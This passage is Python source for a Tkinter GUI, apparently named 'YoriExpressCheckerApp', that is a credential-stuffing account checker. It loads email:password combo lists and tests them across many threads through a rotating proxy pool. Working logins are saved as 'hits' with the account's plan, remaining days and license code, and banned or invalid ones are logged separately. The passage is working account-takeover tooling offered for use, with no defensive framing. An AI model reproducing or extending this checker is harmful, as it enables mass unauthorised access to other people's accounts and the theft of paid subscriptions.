                data = result.get("data", {})
                email = result.get("email", "unknown")
                plan = data.get("plan", "Unknown")
                days_left = data.get("days_left", 0)
                license_code = data.get("license", "N/A")

                filename = (
                    f"plan_{safe_filename(plan)}_"
                    f"days_{days_left}_"
                    f"lic_{safe_filename(license_code)}_"
                    f"{safe_filename(email)}.txt"
                )
                filepath = os.path.join(self.paths["hits_dir"], filename)

                with open(filepath, "w", encoding="utf-8") as handle:
                    handle.write(result.get("multiline", "") + "\n")

                with open(self.paths["hits_all"], "a", encoding="utf-8") as handle:
                    handle.write(result.get("multiline", "") + "\n\n")

                with open(self.paths["hits_combo"], "a", encoding="utf-8") as handle:
                    handle.write(combo + "\n")

            elif status in ("INVALID", "BAN", "EXPIRED"):
                status_file = os.path.join(self.paths["bad_dir"], f"{status.lower()}.txt")
                with open(status_file, "a", encoding="utf-8") as handle:
                    handle.write(combo + "\n")

                with open(self.paths["bad_all"], "a", encoding="utf-8") as handle:
                    handle.write(f"[{status}] {combo}\n")

            elif status == "ERROR":
                error_message = result.get("error", "Unknown error")
                with open(self.paths["error"], "a", encoding="utf-8") as handle:
                    handle.write(f"[ERROR] {combo} | {error_message}\n")

        except Exception:
            pass

    def open_results(self):
        if self.paths and os.path.isdir(self.paths["run"]):
            if os.name == "nt":
                os.startfile(self.paths["run"])
            else:
                webbrowser.open("file://" + self.paths["run"])
        else:
            messagebox.showinfo(APP_NAME, "No results folder created yet.")

    def start(self):
        combo_path = self.combo_path_var.get().strip()
        if not combo_path or not os.path.isfile(combo_path):
            messagebox.showerror(APP_NAME, "Select a valid combo file first.")
            return

        try:
            threads = int(self.thread_var.get().strip())
            threads = max(1, min(threads, 100))
        except Exception:
            threads = 10

        combos = []
        try:
            with open(combo_path, "r", encoding="utf-8", errors="ignore") as handle:
                for line in handle:
                    match = self.clean_pattern.search(line.strip())
                    if match:
                        combos.append(f"{match.group(1)}:{match.group(2)}")
        except Exception:
            messagebox.showerror(APP_NAME, "Failed to read combo file.")
            return

        combos = list(dict.fromkeys(combos))
        if not combos:
            messagebox.showerror(APP_NAME, "No valid email:pass combos found.")
            return

        self.paths = self._make_run_paths()
        self.run_label.config(text=f"Results folder: {self.paths['run']}")

        self.combo_queue = queue.Queue()
        for combo in combos:
            self.combo_queue.put(combo)

        self.stats = {
            "TOTAL": len(combos),
            "CHECKED": 0,
            "HIT": 0,
            "BAD": 0,
            "ERR": 0
        }
        self.remaining = len(combos)
        self.finished_flag = False
        self.stop_event.clear()
        self.running = True

        self._update_stats()
        self.start_button.config(state="disabled")
        self.stop_button.config(state="normal")

        self._terminal_write("SYSTEM", f"[{now_ts()}] Loaded {len(combos)} formatted combos")
        self._terminal_write("SYSTEM", f"[{now_ts()}] Starting proxy engine...")

        self.proxy_manager.start()
        
        self._terminal_write("SYSTEM", f"[{now_ts()}] Waiting for minimum {self.proxy_manager.min_pool_size} live proxies...")
        
        while not self.proxy_manager.ready_event.is_set() and self.running:
            time.sleep(0.5)
            
        if not self.running:
            return
            
        self._terminal_write("SYSTEM", f"[{now_ts()}] Proxy pool ready! Starting {threads} worker threads")

        for _ in range(threads):
            threading.Thread(target=self._worker, daemon=True).start()

    def stop(self):
        if not self.running:
            return
        self.stop_event.set()
        self.proxy_manager.stop()
        self._terminal_write("WARN", f"[{now_ts()}] Stop requested. Shutting down workers...")

    def _finish(self):
        self.running = False
        self.stop_event.set()
        self.proxy_manager.stop()
        self.start_button.config(state="normal")
        self.stop_button.config(state="disabled")
        self._terminal_write("SYSTEM", f"[{now_ts()}] Run finished")
        self._terminal_write(
            "SYSTEM",
            f"[{now_ts()}] HIT:{self.stats['HIT']} BAD:{self.stats['BAD']} ERR:{self.stats['ERR']}"
        )

    def _worker(self):
        while not self.stop_event.is_set():
            try:
                combo = self.combo_queue.get(timeout=0.75)
            except queue.Empty:
                if self.remaining == 0:
                    break
                continue

            email, password = combo.split(":", 1)

            status, result = check_account(
                email,
                password,
                self.proxy_manager,
                self.ui_queue,
                self.stop_event
            )

            if status == "STOP":
                self.combo_queue.task_done()
                break

            self.ui_queue.put(("result", status, combo, result))
            self.combo_queue.task_done()

            with self.counter_lock:
                self.remaining -= 1
                if self.remaining == 0 and not self.finished_flag:
                    self.finished_flag = True
                    self.ui_queue.put(("finished", None, None, None))

    def _process_queue(self):
        try:
            while True:
                item = self.ui_queue.get_nowait()
                kind = item[0]

                if kind == "log":
                    _, tag, message = item
                    self._terminal_write(tag, message)

                elif kind == "result":
                    _, status, combo, result = item
                    self.stats["CHECKED"] += 1

                    if status == "HIT":
                        self.stats["HIT"] += 1
                        self._terminal_write("HIT", f"[{now_ts()}] HIT -> {combo}")
                        if result and result.get("multiline"):
                            self._terminal_write("HIT", result["multiline"])
                        self._save_result("HIT", combo, result)

                    elif status == "EXPIRED":
                        self.stats["BAD"] += 1
                        self._terminal_write("EXP", f"[{now_ts()}] EXPIRED -> {combo}")
                        self._save_result("EXPIRED", combo, result)

                    elif status in ("INVALID", "BAN"):
                        self.stats["BAD"] += 1
                        self._terminal_write("BAD", f"[{now_ts()}] {status} -> {combo}")
                        self._save_result(status, combo, result)

                    else:
                        self.stats["ERR"] += 1
                        error_message = result.get("error", "Unknown error") if result else "Unknown error"
                        self._terminal_write("ERROR", f"[{now_ts()}] ERROR -> {combo} | {error_message}")
                        self._save_result("ERROR", combo, result)

                    self._update_stats()

                elif kind == "finished":
                    self._finish()

        except queue.Empty:
            pass

        self.proxy_label.config(text=f"Proxy Pool: {self.proxy_manager.count()}")
        self.root.after(100, self._process_queue)


if __name__ == "__main__":
    if TKINTER_AVAILABLE:
        root = tk.Tk()
        app = YoriExpressCheckerApp(root)
        root.mainloop()
    else:
        print("Tkinter not available. Run this script locally with a full Python installation.")